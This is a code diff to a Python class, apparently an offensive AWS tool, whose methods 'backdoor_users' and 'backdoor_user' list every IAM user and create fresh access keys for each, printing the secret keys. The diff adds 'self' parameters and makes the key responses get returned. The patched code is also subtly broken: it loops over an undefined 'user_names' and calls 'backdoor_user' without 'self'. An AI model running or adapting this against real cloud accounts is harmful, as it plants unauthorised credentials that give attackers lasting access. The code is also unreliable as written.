@@ -16,7 +16,7 @@ class Persistence(object):
     def __init__(self):
         self.users = self.get_users()
 
-    def get_users():
+    def get_users(self):
         client = boto3.client('iam')
         response = None
         user_names = []
@@ -40,16 +40,20 @@ class Persistence(object):
 
         return user_names
 
-    def backdoor_users(user_names):
+    def backdoor_users(self):
+        user_name = self.users
+        tokens = []
         for user_name in user_names:
-            backdoor_user(user_name)
+            tokens.append(backdoor_user(user_name))
+        return tokens
 
-    def backdoor_user(user_name):
+    def backdoor_user(self, user_name):
         print(user_name)
         client = boto3.client('iam')
         try:
             response = client.create_access_key(UserName=user_name)
             print("  " + response['AccessKey']['AccessKeyId'])
             print("  " + response['AccessKey']['SecretAccessKey'])
+            return response
         except ClientError as e:
             print("  " + e.response['Error']['Message'])
